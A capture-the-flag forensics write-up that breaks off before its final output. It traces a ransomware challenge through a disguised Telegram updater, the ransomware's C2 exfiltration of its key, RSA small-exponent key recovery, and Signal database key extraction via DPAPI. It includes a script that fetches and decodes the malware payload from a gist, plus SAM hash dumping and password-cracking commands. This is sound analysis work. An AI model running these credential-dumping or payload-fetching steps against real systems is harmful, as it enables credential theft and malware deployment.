# Communicate
### Description
My friend told me that yesterday she received a document from a colleague, then her computer received a new windows update from Microsoft. After updating Windows to the new version, while surfing the web, she suddenly realized that she had been attacked by ransomware, all her important files were encrypted. She panicked and deleted all her documents. With your digital forensic skills, please investigate whether all the encrypted files have been stolen or not! And can you help her recover the data?
### Solve
We are given two files.
```bash
$ ls
capture.pcapng  evidence.ad1
```
So I went on checking the `evidence.ad1` file, and it did not take me so long to find out a malicious file in the victim's system.

![Helper.exe](/img/helper.png)

I extracted it, and checked for the file type.

```bash
$ file Helper.exe
Helper.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

So I used `dnSpy`, a `.NET` debugger to read the file. 

![overview_dec](/img/helper_overview.png)

The app is basically a decryption component of a ransomware program. It starts by printing some ASCII art of a skull, prompting the user the send the money to get the key for decrypting their encrypted files. 

![testrun](/img/testrun_helper.png)

Once the key is provided, the program initiates a recovery process that scans the user's profile directory for any files ending with the specific extension .foooo. For each matching file, it reads the encrypted content, attempts to decrypt it using AES with the user-supplied key, and writes the restored data back to the original filename without the malicious `.foooo` extension.

![checkfo](/img/checkfoo.png)

I then checking the file further to check for the key, maybe i can decrypt the file:DDD. Sadly, the key is randomly generated.

![randkey](/img/randkeygen.png)

So the next phase of the problem should be to find the key. I was thinking the key is hidden in the `.ad1` file, so I spent a whole afternoon just to find for the key and gradually become hopeless:(((. On the second day of the contest, I tried a command to find for any `.exe` filename in the user's folder.

```bash
$ find . -name "*.exe"
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/FileCoAuth.exe
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/FileSyncConfig.exe
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/FileSyncHelper.exe
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/Microsoft.SharePoint.NativeMessagingClient.exe
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/OneDrive.Sync.Service.exe
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/OneDriveActionHelper.exe
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/OneDriveFileLauncher.exe
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/OneDriveLauncher.exe
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/OneDrivePatcher.exe
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/OneDriveSetup.exe
./AppData/Local/Microsoft/OneDrive/25.206.1021.0003/OneDriveUpdaterService.exe
./AppData/Local/Microsoft/OneDrive/OneDrive.App.exe
./AppData/Local/Microsoft/OneDrive/OneDrive.exe
./AppData/Local/Microsoft/OneDrive/OneDriveStandaloneUpdater.exe
./AppData/Local/Microsoft/WindowsApps/GameBarElevatedFT_Alias.exe
./AppData/Local/Microsoft/WindowsApps/GetHelp.exe
./AppData/Local/Microsoft/WindowsApps/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe/python.exe
./AppData/Local/Microsoft/WindowsApps/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe/python3.7.exe
./AppData/Local/Microsoft/WindowsApps/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe/python3.exe
./AppData/Local/Microsoft/WindowsApps/Microsoft.GetHelp_8wekyb3d8bbwe/GetHelp.exe
./AppData/Local/Microsoft/WindowsApps/Microsoft.SkypeApp_kzf8qxf38zg5c/Skype.exe
./AppData/Local/Microsoft/WindowsApps/Microsoft.XboxGamingOverlay_8wekyb3d8bbwe/GameBarElevatedFT_Alias.exe
./AppData/Local/Microsoft/WindowsApps/python.exe
./AppData/Local/Microsoft/WindowsApps/python3.7.exe
./AppData/Local/Microsoft/WindowsApps/python3.exe
./AppData/Local/Microsoft/WindowsApps/Skype.exe
./AppData/Local/Programs/Session/resources/elevate.exe
./AppData/Local/Programs/Session/Session.exe
./AppData/Local/Programs/Session/Uninstall Session.exe
./AppData/Local/Programs/signal-desktop/resources/elevate.exe
./AppData/Local/Programs/signal-desktop/Signal.exe
./AppData/Local/Programs/signal-desktop/Uninstall Signal.exe
./AppData/Local/session-desktop-updater/installer.exe
./AppData/Local/Temp/1A7AE6E3-F01A-4756-BFB4-C6303D8E4A23/DismHost.exe
./AppData/Local/Temp/vmware-sosona/VMwareDnD/b700c607/Exterro_FTK_Imager_(x64)-4.7.3.81.exe
./AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Update.exe
./AppData/Roaming/Signal/update-cache/signal-desktop-win-x64-7.79.0.exe
./AppData/Roaming/Telegram Desktop/Telegram.exe
./AppData/Roaming/Telegram Desktop/unins000.exe
./AppData/Roaming/Telegram Desktop/Updater.exe
./Desktop/Helper.exe
./Downloads/ChromeSetup.exe
./Downloads/Exterro_FTK_Imager_(x64)-4.7.3.81.exe
./Downloads/session-desktop-win-x64-1.17.2.exe
./Downloads/SignalSetup.exe
./Downloads/tsetup-x64.6.2.4.exe
./Downloads/winrar-x64-712.exe
./Downloads/Wireshark-4.6.0-x64.exe
```
At first glace, I thought these were just normal files of the system. But I reread the description. 

*My friend told me that yesterday she received a document from a colleague, then her computer received a new windows update from Microsoft.*

The victim used Telegram to chat with their collegues, and in the `Telegram Desktop` folder, there is a malicious `.exe` file, based on the output of the `grep` command.

```bash
./AppData/Roaming/Telegram Desktop/Updater.exe    <-----
```
The default `Telegram.exe` and `unins000.exe` app of Telegram can be ignored, but the `Updater.exe` is kinda weird. My OSINT skills told me that the `Telegram.exe` handles update and `unins000.exe` responsible for the uninstallation progress. So now I went on checking that `Updater.exe` file.

![update_overview](/img/update_overview.png)

Hmmm, it seems that the author intendedly make the file become hard to read :DDDDD.

So this file is used to download the payload, which is the ransomware of this challenge. Specifically, this file checked if it is ran in a sandbox (anti-analysis) by finding whether the process `SbieDll.dll` is running. If yes, the app automatically turns it off. 

![sandbox](/img/sandbox.png)

The malware then connect to `http://ip-api.com/line/?fields=hosting` to check whether the user's current IP is belong to a hosting (datacenter) or not. If yes, the malware shutdown itself.

![check_hosting](/img/check_host.png)

The malware did not run immediately after all the previous requirements satisfied, it waits for the user to type some "hotkeys" including: `Ctrl + C, Ctrl + V, Ctrl + A`.

![hotket](/img/hotkey.png)

After the victim pressed any of the given keys, the malware will download a payload from `https://gist.githubusercontent.com/YoNoob841/6e84cf5e3f766ce3b420d2e4edcc6ab6/raw/57e4d9dcd9691cd6286e9552d448e413f62f8b1f/NjtvSTuePfCiiXpCDzCUiCVBifJnLu`

To gain the URL, I used a script that mimic the algorithm the malware used.

```python
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_malware_url():
    passphrase_string = "QjRrbkVFN1Uzdw==" 
    encrypted_base64 = "/jd1pt5XzE3pcXSJ4FhYNxpBFHYGA6MOUaWVshBsinIckITH6QuPC9VFOBJE5b9hKwoXSJ9ftg4v9doYN1VhQUuayvJvCVZFXtxaMRtrg7DUlE9draq5y/iY+LJA2F+MY4mLvYvD3B7YN31QDn834JmqXeIYbJTVtWTCXa0WVzfI8lBkk9vrFozAirXaQrIJbYHDN4yPjkxkIdzRgilJpg=="
    pass_bytes = passphrase_string.encode('utf-8')
    md5_hash = hashlib.md5(pass_bytes).digest()
    key = bytearray(32)
    key[0:16] = md5_hash
    key[15:15+16] = md5_hash

    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_bytes = base64.b64decode(encrypted_base64)
    decrypted_bytes = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
    print(decrypted_bytes.decode('utf-8'))

decrypt_malware_url()
```
When visiting the URL, I can see the payload, which is not human-readable:D.

![paaaaay](/img/payload.png)

I used this script to imitate the process of downloading the paylod, decrypt it, and write the data to a `payload.exe` file.

```python
import hashlib
import base64
import re
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

PAYLOAD_URL = "https://gist.githubusercontent.com/YoNoob841/6e84cf5e3f766ce3b420d2e4edcc6ab6/raw/57e4d9dcd9691cd6286e9552d448e413f62f8b1f/NjtvSTuePfCiiXpCDzCUiCVBifJnLu"
PASSPHRASE_STRING = "QjRrbkVFN1Uzdw=="
ENCRYPTED_XOR_KEY_B64 = "y8yR2nViEW5gZl/FTZHGbA=="

def get_aes_key(passphrase):
    pass_bytes = passphrase.encode('utf-8')
    md5_hash = hashlib.md5(pass_bytes).digest()
    
    key = bytearray(32)
    key[0:16] = md5_hash
    key[15:15+16] = md5_hash
    return bytes(key)

def decrypt_config_string(encrypted_b64, aes_key):
    cipher = AES.new(aes_key, AES.MODE_ECB)
    encrypted_bytes = base64.b64decode(encrypted_b64)
    decrypted_bytes = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)
    return decrypted_bytes.decode('utf-8')

def download_and_extract_payload(url, xor_key_string):
    response = requests.get(url)
    content = response.text
    
    hex_matches = re.findall(r"\\x([0-9A-Fa-f]{2})", content)
    payload_encrypted = bytearray([int(h, 16) for h in hex_matches])
    
    xor_key_bytes = xor_key_string.encode('utf-8')
    payload_decrypted = bytearray(len(payload_encrypted))
    
    for i in range(len(payload_encrypted)):
        payload_decrypted[i] = payload_encrypted[i] ^ xor_key_bytes[i % len(xor_key_bytes)]
    
    with open("payload.exe", "wb") as f:
        f.write(payload_decrypted)

def main():
    aes_key = get_aes_key(PASSPHRASE_STRING)
    real_xor_key = decrypt_config_string(ENCRYPTED_XOR_KEY_B64, aes_key)
    download_and_extract_payload(PAYLOAD_URL, real_xor_key)

if __name__ == "__main__":
    main()
```

I used `dnSpy` to open the `payload.exe`, and wow, another not-human-friendly malware, or is it?

![nonhumna](/img/non_humna_win.png)

What are these strings?

![?????](/img/ask_string.png)

Dont worry, because I am a final nonchalant boss. I noticed the line `[module: ConfusedBy("ConfuserEx v1.0.0")]`. I then OSINTing what is ConfuserEx, and I know that it is an open-source, free protector for .NET applications. So I went on googling how to defuse the payload, and I found `de4dot-cex`: https://github.com/ViRb3/de4dot-cex

I downloaded it and throw the whole `payload.exe` for it to defuse. And voila, finally some human-friendly stuff. 

![omg](/img/human_freidnly.png)

So techinally this .NET-based ransomware, masquerading as a legitimate "WindowsUpdate" process, begins execution by employing anti-analysis techniques within its module initializer to detect debuggers or active profiling environments, immediately terminating via `Environment.FailFast` if such tools are present to evade detection. Upon bypassing these checks, it generates a random `32-byte AES key` and traverses the user's profile directory to encrypt files using AES-CBC mode, appending the specific extension `.foooo` to the encrypted data while deleting the original files. To ensure only the attacker can decrypt the data, the malware utilizes a hybrid encryption scheme where the session AES key is encrypted using a hardcoded RSA public key and subsequently exfiltrated along with the machine name via a TCP connection to a hardcoded Command and Control (C2) server at `172.25.242.197:31245`, finally concluding the attack by dropping a ransom note (READ_ME_1.txt) demanding $3,000 in Bitcoin and extracting an embedded executable named `Helper.exe` to the desktop.

![c2_server](/img/c2.png)

```bash
$ echo "MTcyLjI1LjI0Mi4xOTc=" | base64 -d
172.25.242.197
$ echo "MzEyNDU=" | base64 -d
31245
```
So now, I can link the data with the `.pcapng` file. 

![key](/img/key_pcap.png)

There are some vulnerabilities in the encryption algorithm: Unpadded RSA with Small Public Exponent ($e=11$) và Short Message. I used this script to crack the key.

```python
import base64
import gmpy2
from Crypto.Util.number import bytes_to_long, long_to_bytes

MODULUS_B64 = "skPMyONckX14WQw3G+wzCRqjkbZQbgvjRbDQ1uWj8wE//18vnh4MgxPsyjcBXYjm20zNWqNOY8xAzEBEqpPfePa4zdU5mwJeFCAjPiVkpi7VCxoGzOyJjvxMGYog3Skp1BIZGvy1xjjDTCxTA/u/ko6lG0cHPtHZ+o6Nci+7zhVo9NTNwLAW7viJ0DGOr5/Z+xydOeqQM8rIBQ+ftmNS9MbUsxpLYsw43xV50dEBh7VUmLLCosxaNe+EmqEz/BDExSKLgJ0dpBeD9nXktmaI/jaDdBnauoBmaJSG/hNO/5fsTHVVmnm29fqwyeG46vfWiSXdl4z50nKEuwsZLdkP4/lDJOggJ1yE9cr9xS7m6jVjMbC5hQcD152WiB2Unwz2hWlwgfD93RfagomHu5r6P441Gbgqnq2nLt7XchRIxljKbHrgKwJ2epr0qr1JpACal1jYb8od60igweIXNuGSWFhl2JceIPwRr0blzXaZGaaVo0b+fmnWAsd2k41IO7NsqfTw59Oc3tXXoKeM+hYLu3OqK+xYbjD/Jpa8L3PpvcER3jak8VN4eiGF0APJGdOhMiQOIAFav5i21OJlUYhxCAzQBpYkE6ETgJhWyfOvE8B283XBBT1khXm/o+zfquqMrZ3QoxPlbqYVWhbz+WWep82a13l/mBO3bi24ZFoOAI8jaei8juhU0QdCHWkria3Si7OMPNpFwYrA4MuWHk54/JZZA13qonYmKNK02/6aQ3AsyFIwGj7MNzAFddP+qgx9mg6uFcFBYV5DzuBIRXe5Hqxx2LGBhKEM6+NXtGjOMujqNDyTu2gcKevTz//DUfdFLppy8sYpluBS1wI5HVeHUT53pY71YW8dNmzk88pMC+C9WpQfzh8nBC77zm8sgLEI2CL7AfirWZJJ6pieQ0Q3th8p5/kp7v3OG8m9zUOibXjsyItMxvdQHskpdn0L40HXpsTIBHyiHJ2OggVBrfZj1GyUqjatFXt2qctEdWW14NtlrRZrhUFjAN7FUyg9owTxX5qnV4x7j/zkhjd+kMpiTR4g3eRfoqrDIzsqMky7kvgKP5xgxZCD2Md5Qs/pQdyHBWA9VjYVW4ObXHPv/CXAvHtq4j+Aqkw1BKxi5hru7ue9QNyamCb9X/foVfneB0NCwq4kYLh2A6B54jSkaivOPTCeRWLhbzy75w3RkjubN8/PSfNsATSvIetzxC6eDFtNl7GYr3C7yhi69PHQGImBg9LTqiSDbzZ5kLGQeyfe+ulca58sBwLm1tksJltlkLwGcD0GsPZqc8jFPpDRbDRlH1z/oRyMT4cuBrbZjDE2XbBfTDBRjgPYasHM6J/VjzJ/0e9ra2jxunJsbke6eeXLCQ=="

EXPONENT = 11

CIPHERTEXT_B64 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB8IC4Trih+khi8MyjTamCVBVadQHENaQxoOkz9SF8elWnrfIMICzVhwa1PIBP5x4MNcSCnAhjyu//ukvC5xkN/lbN1UpEwraijcFvwO4mEphW/gd2Z7lyORZ2zdVW3SNFCWVGIojzSl4Ph+xoHheJde9iAzT3z1fGT5NG5lWtV331u4SLZ8wVXc1zNNXklKRhYWlIVzagvjTdF26Wk6Vsld9JSkdiN+WZgz8Aka5FK4splAxPJX3VFtBxhLqCBWsqpuuOgAaLEuxxwc0vePe6DlvTxnntODCAZCEeDUe5C1+iUVieO7NeYyx1aFf75T0XdDZAKGSgW7HdM9DBMGMlVAEdCq3OTMbp+rTUkhsW3LZIrcVpGGBlkFy/a39xu5JnNzaJFCTtjy6kqDHhctfu6fsQ0dXrrHQN/UjiaitEdHMS7G3OTcaTqpf01nhPxlypaW+P28kW+YVTrFWJycUvglGBdmdbv2ttsoRpFE6tGXNDqnKRK4yr/8JPkH/mhMrruCYUZMIr2+R0HoDQxXm0BMOrBUUSzPxdXPD6hYwSma1AHeptmaRX5n+8gpeleweOGiJAFLoui5WDQeiEowBZZZJlKbbFGFIfwx722pdkEYVIuMfAxPIDUf21oJj01wHrBxQ=="

def solve():
    n_bytes = base64.b64decode(MODULUS_B64)
    N = bytes_to_long(n_bytes)
    
    c_bytes = base64.b64decode(CIPHERTEXT_B64)
    C = bytes_to_long(c_bytes)

    for k in range(100000):
        target = C + (k * N)
        root, exact = gmpy2.iroot(target, EXPONENT)
        
        if exact:
            recovered_bytes = long_to_bytes(root)
            aes_key_base64 = recovered_bytes.decode('utf-8')
            print(aes_key_base64)
            break

solve()
```
```powershell
python .\dec.py
Wu/F6K9CnxuCS0ubNF5CEceMumb155dGnV2714cOp8g=
```
Lets use the key to open the `Important_File_You_Need!!!.dat.foooo` file.

![important](/img/import.png)

I used this script.

```python
import base64
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

CRACKED_KEY_B64 = "Wu/F6K9CnxuCS0ubNF5CEceMumb155dGnV2714cOp8g="
INPUT_FILENAME = "Important_File_You_Need!!!.dat.foooo"
OUTPUT_FILENAME = "Important_File_You_Need!!!.dat"

def decrypt_file():
    aes_key = base64.b64decode(CRACKED_KEY_B64)
    
    with open(INPUT_FILENAME, 'r', encoding='utf-8') as f:
        encrypted_content_b64 = f.read()
    
    encrypted_bytes_with_iv = base64.b64decode(encrypted_content_b64)
    
    iv = encrypted_bytes_with_iv[:16]
    ciphertext = encrypted_bytes_with_iv[16:]
    
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted_padded = cipher.decrypt(ciphertext)
    decrypted_data_layer2 = unpad(decrypted_padded, AES.block_size)
    
    original_base64_string = decrypted_data_layer2.decode('utf-8')
    original_file_bytes = base64.b64decode(original_base64_string)
    
    with open(OUTPUT_FILENAME, 'wb') as f_out:
        f_out.write(original_file_bytes)

decrypt_file()
```
```bash
$ python .\ra.py
$ cat Important_File_You_Need!!!.dat
1sEBqnfISGHFzez30KhVKiS2i8EEwtnxys2EYLQqZtgkAdC9x6j2lchnTfxzD4gneTTIQ3X32Is1yTVxlBc2qCaDLTCXCLYCpmRkoifCkBqRyoXeUnZP4bYbHXoy8s6wIdDOc0ROIThhXSVVbrGhmyHF8sorD8tZqYp7Ik6zlTiMCi5yBTuwqLA5uNXvbW1xK4JAtENoKSQoGNzsrKYRjEeuRwkzHd9uCTc8iXWeSgozwSZSrZguycrBNGBs0mg5V3DmKeB792Sxr4nTTEg3I3nhnce52tyzkIYNlqdMijrmOhodO70riKhcbqgFjSCREmmctacbUQv
```

I carried some OSINT research and know that the decrypted data is not `base64` encoded, but `base62`. So I write a script to decode it (actually, the data is base62 encoded multiple times from the plaintext, so I have shorten this wu by providing the recursive base62 decoding script:DDDDD)

```python
import sys

ENCODED_DATA = "1sEBqnfISGHFzez30KhVKiS2i8EEwtnxys2EYLQqZtgkAdC9x6j2lchnTfxzD4gneTTIQ3X32Is1yTVxlBc2qCaDLTCXCLYCpmRkoifCkBqRyoXeUnZP4bYbHXoy8s6wIdDOc0ROIThhXSVVbrGhmyHF8sorD8tZqYp7Ik6zlTiMCi5yBTuwqLA5uNXvbW1xK4JAtENoKSQoGNzsrKYRjEeuRwkzHd9uCTc8iXWeSgozwSZSrZguycrBNGBs0mg5V3DmKeB792Sxr4nTTEg3I3nhnce52tyzkIYNlqdMijrmOhodO70riKhcbqgFjSCREmmctacbUQv"
BASE62_ALPHABET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

def base62_decode(string):
    base = 62
    length = len(string)
    num = 0
    idx = 0
    
    for char in string:
        power = (length - (idx + 1))
        num += BASE62_ALPHABET.index(char) * (base ** power)
        idx += 1

    decoded_bytes = []
    while num > 0:
        decoded_bytes.append(num & 0xFF)
        num >>= 8
    
    return bytes(decoded_bytes[::-1])

def try_recursive_decode(data, depth=1):
    current_str = data
    
    decoded_bytes = base62_decode(current_str)
    decoded_text = decoded_bytes.decode('utf-8')
    
    print(decoded_text)
    
    if all(c in BASE62_ALPHABET for c in decoded_text.strip()):
        if try_recursive_decode(decoded_text.strip(), depth + 1):
            return True
    
    return False

try_recursive_decode(ENCODED_DATA)
```
```bash
$ python .\ra.py
7bp4aocY2Y3YE83qjCzeGpfBqmfEiDrggLbA59zWLimBLfZsMRXxrteS08Bqk0hVTcg9RquW0CwBTB20gX0gFiUSDlinUAK3D01FTwJSqoKXcmuro2xnALrJC0d1TLCJvM8DIpVLDFUALlSeUqGMuHntgMbMXSAydIoxAq5eCRrWdg4OHEvc0KQlY2skjbgON5HyBqHx6vDBl9k7bhiGFXwYUQ59WU8LTXcGT2ioIYLDB7shYLOwou
43q0pbzNYTz2CSDQ4hn0Pbwyt8nKTVBLPovpGlZVk0CLRk14AP4PhLGUzJQ9oRBwJ3mjwuiiOsF8Nyfn5kbHd5FoOw7kKzmolAxeK3kS8ivyZdg1vgOdUj0SFRmieEFovwZxWEfpaUztOQfdiNxYWcpp5ae3TCeNbR9jvT9L4KLBlfovh1pHXTL
3zk9HiGy3ZtZCW7e9RBaMeydtXzhDQhZitNZRJsnMm6ZUNwWCBBU74GJ9WHSJGrJbwLc2z6S8FfPUZXzI9nwV9x55ysBI9V4ykNWLl9yvLlneI0CPmMbSmD3czE9gvAeKg5PFBjg
8LOLdUzZ1GnMalfpPeFBtIlMiZI1YhtLV7QwQE0OoIeKBeeZfxpKnMKa0oGeZFrVrkURZurmedXjFogbtEjMjCk4NvnzTGgAzcer4
YL4YM639okNywMxss5pkggynkLDqnh3CiOv65sdO2lPmq8pjqHWM6lBpByblMzRutQ8cMhx8vjZ
4nD-Brok3n_RSA_key_with_Sm4l1_Exp0n3nt!!Chiyochiyochiyo}
```
Yeahhh, the second part.

#### Second part: 4nD-Brok3n_RSA_key_with_Sm4l1_Exp0n3nt!!Chiyochiyochiyo}

And now for the first part. By checking the `Desktop` folder of the victim, we can see that they use 2 chat apps, that are Signal and Talagrem.

![chatapp](/img/chatapp.png)

I have already checked talagrem, and got the second part, so now we should focus on the first one. Let go on checking the `Signal` database.

![signalapp](/img/signal_sql.png)

But here's the deal. The database is encrypted, luckily, the key to decrypt it is stored locally in the `config.json` file in the `Signal` folder. But sadly, the original key has one more encrypted layer - the Windows DPAPI (Data Protection API). 

![encrypted](/img/ency.png)

So, we need two things to crack this password.

- User's MasterKey
- User's login password

Lets find those two. I need to gather some files/folders including: `SAM`, `SYSTEM`, `Protect` and `config.json`.

![ingrdients](/img/cook.png)

I extracted the NTLM Hash of the user.

```bash
$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies



[*] Target system bootKey: 0x47a90e8dc4a408ea13eddc25b4e88c13

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:733026a5af82d38db29550ae88f4c8b1:::

sosona:1001:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::

[*] Cleaning up...
```

And I threw the hash the `https://crackstation.net/` and I found that the password is actually `qwerty`.

![quay](/img/quaytay.png)

I extracted the MasterKey using that password (the tools I used here is dpapi.py: https://raw.githubusercontent.com/fortra/impacket/master/examples/dpapi.py).

```bash
$ python3 dpapi.py masterkey -file "2e2daf1a-e776-42c9-b060-591f28b69bdd" -sid "S-1-5-21-1050944156-4264195685-750733359-1001" -password "qwerty"
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 2e2daf1a-e776-42c9-b060-591f28b69bdd
Flags       :        5 (5)
Policy      :       15 (21)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Decrypted key with User Key (SHA1)
Decrypted key: 0x82ed124c5d0ef583a1e5eb190cf740c476be4498b708432a46c2c14646ef4ef5fd3e0b33de56d450393668806060a715b2aa4d4b19377c1a1a8f2d50b12e618f

$ python3 dpapi.py masterkey -file "d1cd97b9-2ab7-4398-ba1f-228f87eccffa" -sid "S-1-5-21-1050944156-4264195685-750733359-1001" -password "qwerty"
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : d1cd97b9-2ab7-4398-ba1f-228f87eccffa
Flags       :        5 (5)
Policy      :       15 (21)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Decrypted key with User Key (SHA1)
Decrypted key: 0x9775cb01f73eff2bd8ff943ae9040d753804d2c9ffd513c1db2ca218c7b9225817bbb24c77c7e52577fb916e52137744fdd917f5180b56c4e8a9fef4bf1a0da9
```
This is where the problem begin, I tried to use the same tool to gain the database key, but it seems that the encrypted key is actually not protected by DPAPI (as DPAPI header tend to start with 010000 but this key starts with `7631...`).

```bash
$ cat config.json
{
  "encryptedKey": "76313096070814191ae36a2dc52e8d93223300dff299666ee4d45a43bdbe3268747291c30afbfff7fd7fc0708f77a613dd1989cf16812a703eec43022476cf14fb6635c480024784ecd5c2ad21dfb163e234e85bdfcddf04767a958fb3bb9a"
}
$ python3 dpapi.py unprotect -key 0x82ed124c5d0ef583a1e5eb190cf740c476be4498b708432a46c2c14646ef4ef5fd3e0b33de56d450393668806060a715b2aa4d4b19377c1a1a8f2d50b12e618f -file signal.blob
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

ERROR: ('unpack requires a buffer of 4 bytes', "When unpacking field 'CryptAlgo | <L=0 | b''[:4]'")
$ python3 dpapi.py unprotect -key 0x9775cb01f73eff2bd8ff943ae9040d753804d2c9ffd513c1db2ca218c7b9225817bbb24c77c7e52577fb916e52137744fdd917f5180b56c4e8a9fef4bf1a0da9 -file signal.blob
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

ERROR: ('unpack requires a buffer of 4 bytes', "When unpacking field 'CryptAlgo | <L=0 | b''[:4]'")
```
After some OSINT efforts, I know that the key I was trying to decrypt is protected using Chromium Security Mechanism (just like how Chrome stores our password/cookie). So I need to get the file `Local State`, which really store the key to open the Database.

![local](/img/localstate.png)

I repeated the same process I did previously, and now, I got the key.

```bash
$ python3 -c "import base64; data = base64.b64decode('RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAC5l83RtyqYQ7ofIo+H7M/6EAAAABIAAABDAGgAcgBvAG0AaQB1AG0AAAAQZgAAAAEAACAAAAAtXrgHFLC/W5JxgtkrDSMFS0y0GQHkXxPgWvApwZRz2gAAAAAOgAAAAAIAACAAAAAM/+j8nvEpApUYMFYhlGaVxXdrbckM6qUrOCDGBdP5zTAAAAAZyr9FVvwSjH8cLgbLlWoHLhflMTinTmc0t+WQV1+dI9Exsn+L0R/xfW82YzAWpHBAAAAACB9DoqAZX7Ts9L76TbYIlbDxeV4wWiGOqAh+zmoVJfiXUPf6qNYpp7E3Bpow2KWMDxjCpL2FNxpNCI0D6aCEyA=='); open('local_state.bin', 'wb').write(data[5:])"
$ python3 dpapi.py unprotect -key 0x82ed124c5d0ef583a1e5eb190cf740c476be4498b708432a46c2c14646ef4ef5fd3e0b33de56d450393668806060a715b2aa4d4b19377c1a1a8f2d50b12e618f -file local_state.bin
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

ERROR: Padding is incorrect.
$ python3 dpapi.py unprotect -key 0x9775cb01f73eff2bd8ff943ae9040d753804d2c9ffd513c1db2ca218c7b9225817bbb24c77c7e52577fb916e52137744fdd917f5180b56c4e8a9fef4bf1a0da9 -file local_state.bin
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

Successfully decrypted data
 0000   5A 98 5F 65 71 4E 07 3C  05 CD 29 29 C8 3F 9C 18   Z._eqN.<..)).?..
 0010   61 ED 0B BB DE B7 26 B5  56 D9 4C 51 58 FE EF 0E   a.....&.V.LQX...
```
OK, now I need to use this key to decrypt the orginal encryptedKey.

```python
import binascii
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

aes_key_hex = "5a985f65714e073c05cd2929c83f9c1861ed0bbbdeb726b556d94c5158feef0e"

def get_db_key():
    with open("signal.blob", "rb") as f:
        encrypted_data = f.read()

    nonce = encrypted_data[3:15]
    ciphertext = encrypted_data[15:]

    key = binascii.unhexlify(aes_key_hex)
    aesgcm = AESGCM(key)
    plaintext = aesgcm.decrypt(nonce, ciphertext, None)

    print("0x" + plaintext.hex())

get_db_key()
```
```bash
$ python try_dec.py
0x3564373935323239323037326163333230653064363631303864343766626334646533303633393663623832373063616264643835356661303962336261363
```
I tried the password a few times until I realised the script was kinda stupid. The printed data was actually hex of hex, which means that python print the hex version of the plaintext (instead of printing `5`, it prints `35`...). So I used this script to reverse it.

```python
import binascii

wrong_key_hex = "35643739353232393230373261633332306530643636313038643437666263346465333036333936636238323730636162646438353566613039623362613639"

real_key_bytes = binascii.unhexlify(wrong_key_hex)
real_key_string = real_key_bytes.decode('utf-8')

print("0x" + real_key_string)
```
This should now give us the real key.
```bash
$ python sec.py
